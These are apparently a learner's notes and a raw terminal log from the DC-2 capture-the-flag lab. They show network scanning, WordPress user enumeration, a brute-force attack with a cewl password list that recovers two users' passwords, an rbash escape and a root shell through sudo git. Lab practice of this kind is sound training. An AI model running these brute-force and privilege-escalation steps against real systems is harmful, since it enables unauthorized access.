
ifconfig
nmap -sn 192.168.56.0/24 
nmap -sV -p- -A 192.168.56.107/24
nmap -p80 --script http-wordpress-users 192.168.56.105   
OR
wpscan --url http://dc-2/ -enumerate --disable-tls-checks   - find users
nano /etc/hosts  
wget 192.168.56.107

Lets now login to the site and see. So the default login page for wordpress exists in
/wp-login.php

dirb http://dc-2/

ls /usr/share/wordlists/

cewl http://dc-2/ > /usr/share/wordlists/cewlpasswords.txt -creating a wordlist

wpscan --url http://dc-2/ --passwords /usr/share/wordlists/cewlpasswords.txt --usernames tom,jerry,admin
OR
wpscan --url http://dc-2/ -P /usr/share/wordlists/cewlpasswords.txt -U tom,jerry,admin
ssh tom@dc-2 -p7744 - ==We have to specify the port because this doesnt use the default port.==


# Flag 2

If you can't exploit WordPress and take a shortcut, there is another way.

Hope you found another entry point.


# Flag 1

**Flag 1:**

Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.

More passwords is always better, but sometimes you just can’t win them all.

Log in as one to see the next flag.

If you can’t find it, log in as another.


# Flag 3

oor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.







-----------------
END_TIME: Tue Jul 21 02:02:34 2026
DOWNLOADED: 32284 - FOUND: 12
                                                                                          
┌──(root㉿kali)-[~]
└─# 
                                                                                          
┌──(root㉿kali)-[~]
└─# 
                                                                                          
┌──(root㉿kali)-[~]
└─# 
                                                                                          
┌──(root㉿kali)-[~]
└─# wpscan --help              
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

Usage: wpscan [options]
        --url URL                                 The URL of the blog to scan
                                                  Allowed Protocols: http, https
                                                  Default Protocol if none provided: http
                                                  This option is mandatory unless update or help or hh or version is/are supplied
    -h, --help                                    Display the simple help and exit
        --hh                                      Display the full help and exit
        --version                                 Display the version and exit
    -v, --verbose                                 Verbose mode
        --[no-]banner                             Whether or not to display the banner
                                                  Default: true
    -o, --output FILE                             Output to FILE
    -f, --format FORMAT                           Output results in the format supplied
                                                  Available choices: cli-no-colour, cli-no-color, json, cli
        --detection-mode MODE                     Default: mixed
                                                  Available choices: mixed, passive, aggressive
        --user-agent, --ua VALUE
        --random-user-agent, --rua                Use a random user-agent for each scan
        --http-auth login:password
    -t, --max-threads VALUE                       The max threads to use
                                                  Default: 5
        --throttle MilliSeconds                   Milliseconds to wait before doing another web request. If used, the max threads will be set to 1.
        --request-timeout SECONDS                 The request timeout in seconds
                                                  Default: 60
        --connect-timeout SECONDS                 The connection timeout in seconds
                                                  Default: 30
        --disable-tls-checks                      Disables SSL/TLS certificate verification, and downgrade to TLS1.0+ (requires cURL 7.66 for the latter)
        --proxy protocol://IP:port                Supported protocols depend on the cURL installed
        --proxy-auth login:password
        --cookie-string COOKIE                    Cookie string to use in requests, format: cookie1=value1[; cookie2=value2]
        --cookie-jar FILE-PATH                    File to read and write cookies
                                                  Default: /tmp/wpscan/cookie_jar.txt
        --force                                   Do not check if the target is running WordPress or returns a 403
        --[no-]update                             Whether or not to update the Database
        --api-token TOKEN                         The WPScan API Token to display vulnerability data, available at https://wpscan.com/profile
        --wp-content-dir DIR                      The wp-content directory if custom or not detected, such as "wp-content"
        --wp-plugins-dir DIR                      The plugins directory if custom or not detected, such as "wp-content/plugins"
    -e, --enumerate [OPTS]                        Enumeration Process
                                                  Available Choices:
                                                   vp   Vulnerable plugins
                                                   ap   All plugins
                                                   p    Popular plugins
                                                   vt   Vulnerable themes
                                                   at   All themes
                                                   t    Popular themes
                                                   tt   Timthumbs
                                                   cb   Config backups
                                                   dbe  Db exports
                                                   u    User IDs range. e.g: u1-5
                                                        Range separator to use: '-'
                                                        Value if no argument supplied: 1-10
                                                   m    Media IDs range. e.g m1-15
                                                        Note: Permalink setting must be set to "Plain" for those to be detected
                                                        Range separator to use: '-'
                                                        Value if no argument supplied: 1-100
                                                  Separator to use between the values: ','
                                                  Default: All Plugins, Config Backups
                                                  Value if no argument supplied: vp,vt,tt,cb,dbe,u,m
                                                  Incompatible choices (only one of each group/s can be used):
                                                   - vp, ap, p
                                                   - vt, at, t
        --exclude-content-based REGEXP_OR_STRING  Exclude all responses matching the Regexp (case insensitive) during parts of the enumeration.
                                                  Both the headers and body are checked. Regexp delimiters are not required.
        --plugins-detection MODE                  Use the supplied mode to enumerate Plugins.
                                                  Default: passive
                                                  Available choices: mixed, passive, aggressive
        --plugins-version-detection MODE          Use the supplied mode to check plugins' versions.
                                                  Default: mixed
                                                  Available choices: mixed, passive, aggressive
        --exclude-usernames REGEXP_OR_STRING      Exclude usernames matching the Regexp/string (case insensitive). Regexp delimiters are not required.
    -P, --passwords FILE-PATH                     List of passwords to use during the password attack.
                                                  If no --username/s option supplied, user enumeration will be run.
    -U, --usernames LIST                          List of usernames to use during the password attack.
                                                  Examples: 'a1', 'a1,a2,a3', '/tmp/a.txt'
        --multicall-max-passwords MAX_PWD         Maximum number of passwords to send by request with XMLRPC multicall
                                                  Default: 500
        --password-attack ATTACK                  Force the supplied attack to be used rather than automatically determining one.
                                                  Multicall will only work against WP < 4.4
                                                  Available choices: wp-login, xmlrpc, xmlrpc-multicall
        --login-uri URI                           The URI of the login page if different from /wp-login.php
        --stealthy                                Alias for --random-user-agent --detection-mode passive --plugins-version-detection passive

[!] To see full list of options use --hh.
                                                                                          
┌──(root㉿kali)-[~]
└─# ls /usr/share/wordlists/
dirb       dnsmap.txt     fern-wifi  legion      nmap.lst        sqlmap.txt  wifite.txt
dirbuster  fasttrack.txt  john.lst   metasploit  rockyou.txt.gz  wfuzz
                                                                                          
┌──(root㉿kali)-[~]
└─# cewl http://dc-2/
CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
nec
amet
sit
vel
orci
quis
site
non
sed
vitae
luctus
sem
leo
Sed
ante
nisi
content
Donec
Aenean
turpis
wrap
tincidunt
dictum
finibus
volutpat
egestas
Vestibulum
justo
odio
eget
neque
erat
quam
vestibulum
sodales
interdum
ipsum
arcu
suscipit
dui
urna
nulla
tellus
nibh
faucibus
blandit
sapien
nisl
laoreet
Suspendisse
sagittis
fermentum
auctor
cursus
eros
dignissim
Pellentesque
lacus
metus
Our
tortor
enim
consectetur
mauris
Proin
malesuada
placerat
rhoncus
velit
commodo
convallis
maximus
posuere
iaculis
dolor
molestie
augue
purus
WordPress
Nullam
hendrerit
Curabitur
viverra
risus
porta
dapibus
diam
nunc
porttitor
imperdiet
lacinia
lobortis
felis
Integer
condimentum
gravida
aliquam
semper
ullamcorper
navigation
scelerisque
Mauris
entry
congue
ultrices
vulputate
header
branding
feugiat
varius
ligula
Feed
Nam
vehicula
ornare
libero
Praesent
bibendum
elit
ultricies
tristique
Maecenas
lorem
euismod
sollicitudin
lectus
Cras
pulvinar
Phasellus
magna
elementum
eleifend
tempus
Flag
rutrum
primis
Quisque
Aliquam
Morbi
fringilla
Etiam
est
Fusce
pharetra
accumsan
Products
People
What
venenatis
efficitur
another
facilisis
consequat
Just
Welcome
Nunc
massa
pellentesque
Duis
Nulla
cubilia
Curae
fames
Vivamus
Skip
text
custom
Menu
mattis
mollis
top
masthead
pretium
contain
page
potenti
Comments
RSD
colophon
powered
Proudly
info
primary
main
post
netus
habitant
morbi
senectus
aliquet
tempor
you
just
can
Interdum
maybe
log
need
cewl
More
passwords
always
better
but
sometimes
the
win
them
all
Log
one
see
find
flag
next
panel
adipiscing
Lorem
down
Scroll
facilisi
Orci
natoque
penatibus
magnis
dis
parturient
montes
nascetur
ridiculus
mus
Your
usual
wordlists
probably
won
work
instead
                                                                                          
┌──(root㉿kali)-[~]
└─# cewl http://dc-2/ /usr/share/wordlists/cewlpasswords.txt
CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)

Missing URL argument (try --help)

                                                                                          
┌──(root㉿kali)-[~]
└─# cewl http://dc-2/ > /usr/share/wordlists/cewlpasswords.txt
                                                                                          
┌──(root㉿kali)-[~]
└─# ls /usr/share/wordlists/cewlpasswords.txt 
/usr/share/wordlists/cewlpasswords.txt
                                                                                          
┌──(root㉿kali)-[~]
└─# wpscan --url http://dc-2/ --password /usr/share/wordlists/cewlpasswords.txt


Scan Aborted: invalid option: --password
Did you mean?  passwords
                                                                                          
┌──(root㉿kali)-[~]
└─# wpscan --url http://dc-2/ --passwords /usr/share/wordlists/cewlpasswords.txt --usernames tom,jerry,admin
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://dc-2/ [192.168.56.107]
[+] Started: Tue Jul 21 02:21:20 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.10 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://dc-2/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).
 | Found By: Rss Generator (Passive Detection)
 |  - http://dc-2/index.php/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>
 |  - http://dc-2/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://dc-2/wp-content/themes/twentyseventeen/
 | Last Updated: 2026-05-20T00:00:00.000Z
 | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 4.1
 | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <===========> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 3 user/s
Trying jerry / CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)Trying admin / CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)Trying tom / CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/) T[SUCCESS] - jerry / adipiscing                                                            
[SUCCESS] - tom / parturient                                                              
Trying admin / instead Time: 00:03:30 <========       > (686 / 1163) 58.98%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Jul 21 02:24:59 2026
[+] Requests Done: 875
[+] Cached Requests: 5
[+] Data Sent: 386.753 KB
[+] Data Received: 24.629 MB
[+] Memory used: 296.125 MB
[+] Elapsed time: 00:03:38
                                                                                          
┌──(root㉿kali)-[~]
└─#  ssh tom@dc-2 -p7744
The authenticity of host '[dc-2]:7744 ([192.168.56.107]:7744)' can't be established.
ED25519 key fingerprint is: SHA256:JEugxeXYqsY0dfaV/hdSQN31Pp0vLi5iGFvQb8cB1YA
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? parturient
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '[dc-2]:7744' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
tom@dc-2's password: 


Permission denied, please try again.
tom@dc-2's password: 



Permission denied, please try again.
tom@dc-2's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
tom@DC-2:~$ ls
flag3.txt  usr
tom@DC-2:~$ cat flag3.txt
-rbash: cat: command not found
tom@DC-2:~$ vi flag3.txt
tom@DC-2:~$ vi

/bin/rbash: /bin/sh: restricted: cannot specify `/' in command names

shell returned 1

Press ENTER or type command to continue
tom@DC-2:~$ su jerry
-rbash: su: command not found
tom@DC-2:~$ parturient
-rbash: parturient: command not found
tom@DC-2:~$ su jerry
-rbash: su: command not found
tom@DC-2:~$ su jerry
-rbash: su: command not found
tom@DC-2:~$ sudo jerry
-rbash: sudo: command not found
tom@DC-2:~$ /usr/bin/su jerry
-rbash: /usr/bin/su: restricted: cannot specify `/' in command names
tom@DC-2:~$ echo PATH
PATH
tom@DC-2:~$ echo $PATH
/home/tom/usr/bin
tom@DC-2:~$ /home/jerry/usr/bin
-rbash: /home/jerry/usr/bin: restricted: cannot specify `/' in command names
tom@DC-2:~$ vi

tom@DC-2:~$ export  PATH=:/bin:/usr/bin
tom@DC-2:~$ ls
flag3.txt  usr
tom@DC-2:~$ cat flag3.txt
Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
tom@DC-2:~$ cat /home/jerry/flag4.txt
Good to see that you've made it this far - but you're not home yet. 

You still need to get the final flag (the only flag that really counts!!!).  

No hints here - you're on your own now.  :-)

Go on - git outta here!!!!

tom@DC-2:~$ su jerry
Password: 
jerry@DC-2:/home/tom$ ls
ls: cannot open directory .: Permission denied
jerry@DC-2:/home/tom$ cat /root/final-flag.txt
cat: /root/final-flag.txt: Permission denied
jerry@DC-2:/home/tom$ sudo -l
Matching Defaults entries for jerry on DC-2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git
jerry@DC-2:/home/tom$ git branch --help
fatal: failed to stat '.': Permission denied
jerry@DC-2:/home/tom$ git branch --help config
fatal: failed to stat '.': Permission denied
jerry@DC-2:/home/tom$ sudo -l
Matching Defaults entries for jerry on DC-2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git
jerry@DC-2:/home/tom$ git branch --help config
fatal: failed to stat '.': Permission denied
jerry@DC-2:/home/tom$ cd /home
jerry@DC-2:/home$ sudo git branch --help config
jerry@DC-2:/home$ 
jerry@DC-2:/home$ sudo git branch --help config
# ls
jerry  tom
# cd /root
# ls
final-flag.txt
# cat final-flag.txt
 __    __     _ _       _                    _ 
/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /
 \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ 
  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   


Congratulatons!!!

A special thanks to all those who sent me tweets
and provided me with feedback - it's all greatly
appreciated.

If you enjoyed this CTF, send me a tweet via @DCAU7.

# 
